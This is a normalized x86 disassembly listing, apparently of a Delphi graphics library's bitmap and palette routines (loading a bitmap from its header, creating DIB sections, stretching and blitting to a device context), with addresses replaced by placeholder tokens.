mov eax ebx
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
lea eax [ ebp - 0x58 ]
xor ecx ecx
mov edx 0x54
call sub_402b40
lea eax [ ebp - 0x58 ]
push eax
push 0x0
push 0x0
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_42395c
mov esi ebx
mov eax [ esi + 0x28 ]
call sub_42246c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_422470
mov eax [ esi + 0x28 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
mov al [ esi + 0x21 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x21 ] al
mov eax [ esi + 0x34 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov al [ esi + 0x38 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x38 ] al
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41471c
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call LeaveCriticalSection
retn
sub_4230a8
push ebp
mov ebp esp
add esp 0xffffffa4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x5c ]
push ecx
mov ecx 0x15
[ edi ] [ esi ]
pop ecx
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_42368c
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_423137
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi [ rw-data ]
jne r-xdata
mov eax esi
call sub_422ca4
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x8 ] esi
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebx + 0x2c ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax edi
call sub_422640
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebx + 0x28 ]
mov al [ eax + 0x70 ]
push eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_42395c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_42313c
mov eax [ ebp - 0x8 ]
call sub_41d0f0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_4038d8
call sub_40392c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
push eax
call DeleteObject
sub_423168
push ebx
mov ebx eax
mov eax ebx
call sub_42345c
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x50 ] edx
xor edx edx
mov [ eax + 0x54 ] edx
add eax 0x6c
call sub_40d1c0
pop ebx
retn
sub_423198
push ebx
push esi
push edi
add esp 0xffffffac
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov esi eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x58 ]
mov eax esi
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
call sub_4166e4
mov eax [ ebx + 0x28 ]
push esi
lea esi [ eax + 0x18 ]
lea edi [ esp + 0x4 ]
mov ecx 0x15
[ edi ] [ esi ]
pop esi
xor eax eax
mov [ esp + 0x14 ] eax
mov eax ebx
call sub_42368c
lea eax [ ebx + 0x2c ]
call sub_40d1c0
push esp
mov eax [ ebx + 0x28 ]
mov al [ eax + 0x70 ]
push eax
push esi
xor ecx ecx
xor edx edx
mov eax ebx
call sub_42395c
add esp 0x54
pop edi
pop esi
pop ebx
retn
sub_42320c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebx + 0x28 ]
mov dl [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_41ee68
mov eax ebx
call sub_42379c
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
push 0xc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetDeviceCaps
push eax
push 0xe
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetDeviceCaps
mov edx eax
pop eax
imul edx
cmp eax 0x8
jg r-xdata
push 0xffffffff
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call RealizePalette
mov [ ebp - 0x9 ] 0x1
xor eax eax
jmp r-xdata
movzx edx [ esi + 0x2a ]
movzx ecx [ esi + 0x28 ]
imul edx ecx
cmp eax edx
jl r-xdata
test al al
je r-xdata
mov al 0x1
mov eax ebx
call sub_423598
test al al
jne r-xdata
lea eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetBrushOrgEx
push 0x4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetStretchBltMode
lea eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0xd ]
push eax
mov eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetBrushOrgEx
jmp r-xdata
xor eax eax
push ebp
push sub_423448
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
push 0x3
mov eax [ ebp - 0x4 ]
call sub_41ed94
push eax
call SetStretchBltMode
mov eax ebx
call sub_4234dc
mov dl [ r-xdata ]
call sub_41ee68
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
mov eax ebx
call sub_42373c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
push eax
mov eax [ esi + 0x20 ]
push eax
mov eax [ esi + 0x1c ]
push eax
push 0x0
push 0x0
mov eax ebx
call sub_4234dc
mov eax [ eax + 0x4 ]
push eax
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
mov eax [ edi + 0x8 ]
sub eax [ edi ]
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call StretchBlt
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42344f
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_4233dd
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call CreateCompatibleDC
call sub_41f18c
mov [ ebp - 0x18 ] eax
mov eax [ esi + 0xc ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
mov [ ebp - 0x1c ] eax
mov eax [ edi + 0x8 ]
sub eax [ edi ]
push eax
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
mov eax ebx
call sub_4234dc
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ esi + 0x1c ]
push eax
mov eax [ esi + 0x20 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0x0
push 0x0
mov ecx [ edi + 0x4 ]
mov edx [ edi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_41f330
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
retn
mov eax [ ebp - 0x18 ]
push eax
call DeleteDC
sub_42345c
push ebx
push esi
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0x4 ] 0x1
jle r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax esi
call sub_42369c
cmp [ ebx + 0x71 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp eax [ ebx + 0x14 ]
je r-xdata
mov eax [ ebx + 0x10 ]
xor eax eax
jmp r-xdata
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
lea edx [ ebx + 0x18 ]
push edx
mov ecx eax
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_4230a8
pop esi
pop ebx
retn
xor eax eax
mov [ ebx + 0x14 ] eax
xor eax eax
mov [ ebx + 0x2c ] eax
push esi
call DeleteObject
test eax eax
jne r-xdata
call sub_41f0e4
sub_4234dc
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x2c ] 0x0
jne r-xdata
mov eax [ ebx + 0x2c ]
pop esi
pop ebx
retn
mov eax ebx
call sub_42369c
cmp [ ebx + 0x2c ] 0x0
jne r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_422278
mov esi eax
mov [ ebx + 0x2c ] esi
mov [ esi + 0x2c ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x10 ]
mov [ esi + 0x28 ] eax
mov [ esi + 0x34 ] ebx
mov [ esi + 0x30 ] sub_423168
sub_423524
push ebx
mov ebx eax
mov eax ebx
call sub_42368c
mov eax ebx
call sub_42369c
mov edx ebx
mov eax ebx
call sub_423168
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
pop ebx
retn
sub_423548
mov eax [ eax + 0x28 ]
mov edx [ eax + 0x8 ]
test edx edx
je r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp edx [ eax + 0x14 ]
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov al 0x1
jmp r-xdata
retn
sub_4235c8
push ebx
mov ebx eax
mov eax [ ebx + 0x34 ]
cmp eax 0x20000000
jne r-xdata
call sub_41d9c0
mov eax ebx
call sub_423598
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
dec eax
push eax
mov eax ebx
call sub_4234dc
xor edx edx
pop ecx
call sub_41ed20
jmp r-xdata
mov eax 0xffffff
jmp r-xdata
or eax 0x2000000
pop ebx
retn
sub_423618
push ebx
push esi
mov ebx [ eax + 0x28 ]
cmp [ ebx + 0x8 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
call sub_42379c
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
lea eax [ ebx + 0x18 ]
push eax
push 0x0
mov esi [ ebx + 0x10 ]
mov ecx esi
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_422640
mov [ ebx + 0x14 ] eax
lea eax [ ebx + 0x18 ]
push eax
push 0x54
mov eax [ ebx + 0x8 ]
push eax
call GetObjectA
lea eax [ ebx + 0x18 ]
mov edx eax
add eax 0x18
mov [ eax ] 0x28
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ edx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] 0x1
mov cx [ edx + 0x10 ]
imul cx [ edx + 0x12 ]
mov [ eax + 0xe ] cx
sub_42369c
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov esp ebp
pop ebp
retn
mov edx [ eax + 0x14 ]
mov [ eax + 0x8 ] edx
cmp [ eax + 0x6c ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ eax + 0x6c ]
call sub_416680
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x10 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0x14 ]
mov [ ebp - 0xc ] edx
xor eax eax
push ebp
push sub_42371f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x10 ] edx
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov edx [ eax + 0x6c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x10 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x14 ] edx
retn
sub_42373c
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x32 ] 0x0
je r-xdata
mov esi [ ebx + 0x28 ]
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
cmp [ ebx + 0x31 ] 0x0
jne r-xdata
mov eax ebx
call sub_42368c
mov eax ebx
call sub_42369c
mov esi [ ebx + 0x28 ]
mov eax ebx
call sub_4235c8
mov ecx eax
mov edx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
call sub_422d08
mov [ esi + 0xc ] eax
mov [ ebx + 0x32 ] 0x1
mov [ ebx + 0x31 ] 0x1
call sub_4221fc
mov eax [ esi + 0xc ]
push eax
call DeleteObject
xor eax eax
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_42379c
push ebx
push esi
push edi
push ebp
mov edi eax
mov ebp [ edi + 0x28 ]
cmp [ edi + 0x30 ] 0x0
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov eax [ ebp + 0x14 ]
cmp eax [ ebp + 0x8 ]
jne r-xdata
mov cx [ ebp + 0x3e ]
mov eax 0x1
shl eax cl
mov ecx eax
xor edx edx
mov eax [ ebp + 0x14 ]
call sub_41f87c
mov esi eax
mov [ ebp + 0x10 ] esi
test esi esi
jne r-xdata
call sub_4221fc
push 0x0
call GetDC
call sub_41f18c
mov esi eax
cmp [ ebp + 0x71 ] 0x0
jne r-xdata
mov bl 0x1
push 0xc
push esi
call GetDeviceCaps
mov ebx eax
push 0xe
push esi
call GetDeviceCaps
imul ebx eax
movzx eax [ ebp + 0x2a ]
movzx edx [ ebp + 0x28 ]
imul edx
cmp ebx eax
jl r-xdata
push esi
push 0x0
call ReleaseDC
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push esi
call CreateHalftonePalette
mov [ ebp + 0x10 ] eax
xor ebx ebx
jmp r-xdata
mov [ edi + 0x30 ] 0x1
mov [ ebp + 0x71 ] bl
test bl bl
je r-xdata
sub_423854
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
mov ebx ecx
mov esi eax
cmp dx 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_41f054
test ebx ebx
jne r-xdata
lea eax [ ebp - 0x54 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx ebx
mov eax esi
call sub_4230a8
mov eax [ esi + 0x28 ]
mov [ eax + 0x70 ] 0x0
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ esi + 0x22 ] al
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
xor eax eax
mov [ ebp - 0x3c ] eax
mov eax esi
call sub_42368c
lea eax [ ebp - 0x54 ]
xor ecx ecx
mov edx 0x54
call sub_402b40
lea eax [ ebp - 0x54 ]
push eax
push 0x54
push ebx
call GetObjectA
cmp [ ebp - 0x40 ] 0x0
jne r-xdata
sub_4238d8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ eax ]
call [ edx ]
push eax
mov eax ebx
call sub_416660
pop ecx
sub ecx eax
mov edx ebx
mov eax esi
call sub_423fec
pop esi
pop ebx
retn
sub_4238fc
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
push ecx
push 0x2
mov eax [ r-xdata ]
mov cl 0x1
xchg edx ecx
call sub_417020
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_423950
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_423a84
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423957
mov eax [ ebp - 0x4 ]
call sub_403124
retn
sub_42395c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4239e3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ eax + 0x8 ] ebx
mov eax [ ebp - 0x8 ]
mov [ eax + 0x10 ] esi
mov eax [ ebp + 0x10 ]
mov edx [ ebp - 0x8 ]
mov esi eax
lea edi [ edx + 0x18 ]
mov ecx 0x15
[ edi ] [ esi ]
mov eax [ ebp - 0x8 ]
mov dl [ ebp + 0xc ]
mov [ eax + 0x70 ] dl
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x2c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ r-xdata ]
call sub_4032d4
mov edx [ ebp - 0x8 ]
mov [ edx + 0x6c ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0x14 ] eax
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_423a43
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_422470
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov [ edx + 0x28 ] eax
call sub_42246c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423a4a
push rw-data
call LeaveCriticalSection
retn
sub_423a5c
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x4
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ esp ]
mov edx esi
mov eax ebx
call sub_423fec
pop edx
pop edi
pop esi
pop ebx
retn
sub_423a84
push ebp
mov ebp esp
add esp 0xffffff54
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x30 ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp - 0x20 ] 0xc
sete [ ebp - 0x21 ]
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
add eax 0xc
add eax 0x400
call sub_4026e4
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x3c ] eax
xor edx edx
push ebp
push sub_423fa1
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
push ebp
push sub_423f74
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov [ ebp - 0x20 ] 0x28
mov ecx [ ebp - 0x20 ]
sub ecx 0x4
mov edx [ ebp - 0x18 ]
add edx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
sub esi [ ebp - 0x20 ]
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x10 ]
cmp eax 0x3
je r-xdata
lea edx [ ebp - 0x48 ]
add edx 0x4
mov ecx 0x8
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx [ ebp - 0x3c ]
mov eax ebx
xor ecx ecx
mov edx 0x28
call sub_402b40
mov eax ebx
movzx edx [ ebp - 0x44 ]
mov [ eax + 0x4 ] edx
movzx edx [ ebp - 0x42 ]
mov [ eax + 0x8 ] edx
mov dx [ ebp - 0x40 ]
mov [ eax + 0xc ] dx
mov dx [ ebp - 0x3e ]
mov [ eax + 0xe ] dx
sub esi 0xc
jmp r-xdata
mov ebx [ ebp - 0x3c ]
mov eax [ ebp - 0x20 ]
mov [ ebx ] eax
mov eax [ ebp - 0x18 ]
add eax [ ebp - 0x20 ]
mov [ ebp - 0x1c ] eax
cmp [ ebx + 0xc ] 0x1
je r-xdata
test eax eax
je r-xdata
cmp [ ebp - 0x20 ] 0x28
jne r-xdata
call sub_41f06c
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov [ ebp - 0x38 ] eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
mov ax [ ebx + 0xe ]
cmp ax 0x10
je r-xdata
mov edx [ ebp + 0x8 ]
mov ecx 0xe
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ecx [ ebp - 0x20 ]
sub ecx 0x4
mov edx [ ebp - 0x18 ]
add edx 0x4
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov eax esi
xor edx edx
push edx
push eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x38 ]
call sub_4168fc
mov edx esi
neg edx
mov cx 0x2
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0xaa ]
xor ecx ecx
mov edx 0xe
call sub_402b40
mov [ ebp - 0xaa ] 0x4d42
mov eax [ ebp - 0x20 ]
add eax esi
mov [ ebp - 0xa8 ] eax
lea eax [ ebp - 0xaa ]
mov [ ebp + 0x8 ] eax
mov ecx [ ebx + 0x20 ]
movzx edi [ ebp - 0x21 ]
xor eax eax
mov al [ edi + rw-data ]
imul ecx eax
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_41688c
mov eax [ ebx + 0x20 ]
xor edx edx
mov dl [ edi + rw-data ]
imul edx
sub esi eax
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
mov ax [ ebx + 0xe ]
call sub_41f2fc
mov [ ebx + 0x20 ] eax
cmp [ ebx + 0x10 ] 0x3
jne r-xdata
cmp ax 0x20
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp esi eax
jbe r-xdata
movzx edx [ ebx + 0xe ]
mov eax [ ebx + 0x4 ]
mov ecx 0x20
call sub_41f31c
mov ecx eax
mov eax [ ebx + 0x8 ]
cdq
xor eax edx
sub eax edx
imul ecx eax
mov [ ebx + 0x14 ] ecx
mov edx [ ebp - 0x1c ]
mov ecx 0xc
mov eax [ ebp - 0x8 ]
call sub_41688c
add [ ebp - 0x1c ] 0xc
sub esi 0xc
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov esi eax
push 0x0
call GetDC
call sub_41f18c
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_423eef
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x10 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
call sub_41f5c4
cmp [ rw-data ] 0x0
je r-xdata
cmp eax 0x3
jne r-xdata
push 0x0
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call CreateDIBSection
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax esi
call sub_4026e4
mov [ ebp - 0x14 ] eax
xor edx edx
push ebp
push sub_423e57
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp - 0x14 ]
mov ecx esi
mov eax [ ebp - 0x8 ]
call sub_41688c
mov eax [ ebp - 0xc ]
push eax
call CreateCompatibleDC
call sub_41f18c
mov [ ebp - 0x10 ] eax
push 0x1
push 0x1
mov eax [ ebp - 0xc ]
push eax
call CreateCompatibleBitmap
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x20 ]
test eax eax
jbe r-xdata
call GetLastError
test eax eax
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_423e2b
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov edx [ ebp - 0x14 ]
push edx
push 0x4
push eax
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov ecx eax
mov edx [ ebp - 0x1c ]
xor eax eax
call sub_41f87c
mov [ ebp - 0x30 ] eax
push 0x0
mov eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
call sub_40cc64
call sub_41f06c
jmp r-xdata
xor eax eax
push ebp
push sub_423ebe
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x14 ]
mov ecx esi
mov eax [ ebp - 0x8 ]
call sub_41688c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423e32
cmp [ ebp - 0x34 ] 0x0
je r-xdata
call GetLastError
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423ef6
mov eax [ ebp - 0xc ]
push eax
push 0x0
call ReleaseDC
retn
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
push eax
call DeleteObject
retn
push 0xffffffff
mov eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
call sub_40cc64
call sub_41f06c
jmp r-xdata
sub_423e32
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_402704
retn
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
sub_423ef6
mov eax [ ebp - 0x3c ]
cmp [ eax + 0xe ] 0x8
jbe r-xdata
lea eax [ ebp - 0x9c ]
xor ecx ecx
mov edx 0x54
call sub_402b40
lea eax [ ebp - 0x9c ]
push eax
push 0x54
mov eax [ ebp - 0x28 ]
push eax
call GetObjectA
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x6c ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x68 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x64 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x24 ]
mov [ ebp - 0x60 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_423f8b
mov eax [ ebp - 0x3c ]
cmp [ eax + 0x20 ] 0x0
jbe r-xdata
cmp [ ebp - 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x3c ]
mov ecx [ eax + 0x20 ]
mov edx [ ebp - 0x1c ]
xor eax eax
call sub_41f87c
mov [ ebp - 0x30 ] eax
sub_423fa8
lea eax [ ebp - 0x9c ]
push eax
mov al [ ebp - 0x21 ]
push eax
mov eax [ ebp - 0x38 ]
push eax
mov ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_42395c
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov edx [ ebp - 0x4 ]
mov [ edx + 0x22 ] al
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_423fec
push ebx
push esi
push edi
add esp 0xffffff9c
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_42368c
test esi esi
jne r-xdata
mov edx esp
mov ecx 0xe
mov eax edi
call sub_41688c
cmp [ esp ] 0x4d42
je r-xdata
lea eax [ esp + 0xe ]
xor ecx ecx
mov edx 0x54
call sub_402b40
lea eax [ esp + 0xe ]
push eax
push 0x0
push 0x0
xor ecx ecx
xor edx edx
mov eax ebx
call sub_42395c
jmp r-xdata
push esp
mov ecx esi
